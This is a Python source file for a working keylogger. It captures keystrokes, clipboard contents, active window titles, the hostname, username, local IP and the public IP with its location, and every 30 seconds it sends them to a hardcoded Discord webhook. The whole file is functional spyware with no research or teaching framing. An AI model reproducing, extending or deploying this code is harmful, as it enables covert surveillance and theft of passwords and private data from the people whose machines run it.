import os
import socket
import getpass
import clipboard
import platform
import psutil
from pynput import keyboard
import requests
import asyncio
import subprocess

# Platform-specific imports
if platform.system() == "Windows":
    import win32gui

# Configuration
LOG_FILE = "key_log.txt"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1248392956709437541/PRnRnhWu38IMbs5Rv_T5IA7YEYyUuBE_MQf_ivdroxaRR6w6Dh7mMutq5AWXMgu5OnRE"
SEND_INTERVAL = 30  # Time interval to send to Discord
BUFFER_FLUSH_INTERVAL = 20  # Time interval to save resources
MAX_DISCORD_MESSAGE_LENGTH = 2000  # Discord's message size limit (Do not change)

# Initialize buffer for storing key logs
log_buffer = []

# Function to get public IP and location
def get_ip_location():
    try:
        response = requests.get('https://ipinfo.io', timeout=5)
        data = response.json()

        location_info = {
            "ip": data.get('ip', 'N/A'),
            "city": data.get('city', 'N/A'),
            "region": data.get('region', 'N/A'),
            "country": data.get('country', 'N/A'),
        }
        return location_info

    except requests.RequestException:
        return {
            "ip": "N/A",
            "city": "N/A",
            "region": "N/A",
            "country": "N/A",
        }

# Get the hostname, username, and IP address of the computer
hostname = socket.gethostname()
username = getpass.getuser()
local_ip_address = socket.gethostbyname(socket.gethostname())
location_info = get_ip_location()

# Initialize the log file
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as f:
        f.write("")

# Function to split the log data into smaller chunks for Discord's message limit
def split_log_data(log_data, max_length=MAX_DISCORD_MESSAGE_LENGTH - 500):
    return [log_data[i:i + max_length] for i in range(0, len(log_data), max_length)]

# Async function to send logs to Discord in chunks if necessary
async def send_log_to_discord():
    while True:
        await asyncio.sleep(SEND_INTERVAL)
        if not os.path.exists(LOG_FILE):
            continue

        with open(LOG_FILE, 'r') as f:
            log_data = f.read()

        if log_data:
            payload_chunks = split_log_data(log_data)

            for chunk in payload_chunks:
                payload = {
                    "content": f"""----------------
**System Information:**
- Hostname: {hostname}
- Username: {username}
- Local IP Address: {local_ip_address}

**Location:**
- IP: {location_info.get('ip', 'N/A')}
- City: {location_info.get('city', 'N/A')}, Region: {location_info.get('region', 'N/A')}, Country: {location_info.get('country', 'N/A')}

**Key Logs (chunk):**
{chunk}
"""
                }
                await send_with_retries(payload)

# Retry mechanism with exponential backoff
async def send_with_retries(payload):
    MAX_RETRIES = 3
    INITIAL_BACKOFF = 1
    BACKOFF_FACTOR = 2
    backoff = INITIAL_BACKOFF
    attempts = 0

    while attempts < MAX_RETRIES:
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
            if response.status_code == 204:
                # Clear the log file after successful send
                with open(LOG_FILE, 'w') as f:
                    f.write("")
                return True
            else:
                print(f"Failed to send log. Status Code: {response.status_code}")
        except requests.RequestException:
            pass

        attempts += 1
        await asyncio.sleep(backoff)
        backoff *= BACKOFF_FACTOR

    return False

# Function to log key press (non-blocking)
def on_press(key):
    global log_buffer
    try:
        log_entry = f'{key.char}'
    except AttributeError:
        if key == keyboard.Key.space:
            log_entry = ' '
        elif key == keyboard.Key.enter:
            log_entry = '\n'
        elif key == keyboard.Key.tab:
            log_entry = '\t'
        else:
            log_entry = f'[{key.name}]'

    log_buffer.append(log_entry)

# Async function to flush buffer to file periodically
async def flush_buffer_to_file():
    global log_buffer
    while True:
        await asyncio.sleep(BUFFER_FLUSH_INTERVAL)
        if log_buffer:
            with open(LOG_FILE, 'a') as f:
                f.write(''.join(log_buffer))
            log_buffer.clear()

# Async function to monitor clipboard
async def monitor_clipboard():
    last_text = clipboard.paste()
    while True:
        await asyncio.sleep(5)
        current_text = clipboard.paste()
        if current_text != last_text:
            with open(LOG_FILE, 'a') as f:
                f.write(f'\n[Clipboard]: {current_text}\n')
            last_text = current_text

# Function to get active window title (platform-specific)
def get_active_window_title():
    if platform.system() == "Windows":
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    elif platform.system() == "Darwin":  # macOS
        script = '''
        tell application "System Events"
            set frontApp to name of first application process whose frontmost is true
        end tell
        return frontApp
        '''
        result = subprocess.run(['osascript', '-e', script], stdout=subprocess.PIPE)
        return result.stdout.decode('utf-8').strip()
    else:
        return "Unknown"

# Async function to log active window
async def log_active_window():
    last_window = get_active_window_title()
    while True:
        await asyncio.sleep(5)
        current_window = get_active_window_title()
        if current_window != last_window:
            with open(LOG_FILE, 'a') as f:
                f.write(f'\n[Active Window]: {current_window}\n')
            last_window = current_window

# Function to log system information (add any additional ones)
def log_system_info():
    with open(LOG_FILE, 'a') as f:
        f.write(f"Node Name: {platform.node()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"CPU Usage: {psutil.cpu_percent()}%\n")
        f.write(f"Memory: {psutil.virtual_memory().total}\n")

# Main async function to start all tasks
async def main():
    log_system_info()

    await asyncio.gather(
        flush_buffer_to_file(),
        send_log_to_discord(),
        monitor_clipboard(),
        log_active_window(),
    )

# Start listening to keyboard events using pynput
if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        loop.run_until_complete(main())
    finally:
        listener.stop()
        loop.close()